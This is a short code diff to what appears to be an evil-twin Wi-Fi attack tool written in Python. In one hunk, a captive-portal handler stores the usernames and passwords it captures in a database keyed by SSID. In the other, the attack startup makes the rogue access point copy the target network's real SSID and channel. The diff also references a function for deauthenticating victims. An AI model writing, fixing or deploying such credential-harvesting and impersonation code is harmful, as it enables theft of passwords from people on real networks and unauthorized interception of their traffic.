@@ -243,16 +243,20 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
 
         # Try saving to sqlite via db_helper if available and CURRENT_SSID set
         try:
-            from db_helper import save_credential  # noqa: E402
+            try:
+                from db_helper import save_credential  # noqa: E402
+            except ImportError:
+                save_credential = None
             # CURRENT_SSID may be defined at module level by your program; try to access it
             ssid = globals().get("CURRENT_SSID", None)
-            if ssid:
-                save_credential(ssid, username, password)
-                print(f"[+] Saved to DB: SSID={ssid} username={username}")
-            else:
-                # Save with blank ssid as fallback
-                save_credential("", username, password)
-                print(f"[+] Saved to DB (no SSID): username={username}")
+            if save_credential:
+                if ssid:
+                    save_credential(ssid, username, password)
+                    print(f"[+] Saved to DB: SSID={ssid} username={username}")
+                else:
+                    # Save with blank ssid as fallback
+                    save_credential("", username, password)
+                    print(f"[+] Saved to DB (no SSID): username={username}")
         except Exception:
             # ignore DB errors (db_helper may not exist in your environment)
             pass
@@ -323,10 +327,9 @@ def deauth_victim(ap_info, victim_mac, iface):
 
 # ——— main attack startup ———
 
-def start_attack(ap_iface, uplink_iface="eth0", output_dir="."):
+def start_attack(ap_iface, ap_info, uplink_iface="eth0", output_dir="."):
     # 1) Generate hostapd.conf & dnsmasq.conf
-    #write_configs(ap_iface, ap_info['SSID'], ap_info['Channel'], output_dir)
-    write_configs(ap_iface, "Freee", 6, output_dir)
+    write_configs(ap_iface, ap_info['SSID'], ap_info['Channel'], output_dir)
 
     # 2) Bring up ap_iface with IP before dnsmasq
     setup_network(ap_iface, uplink_iface)
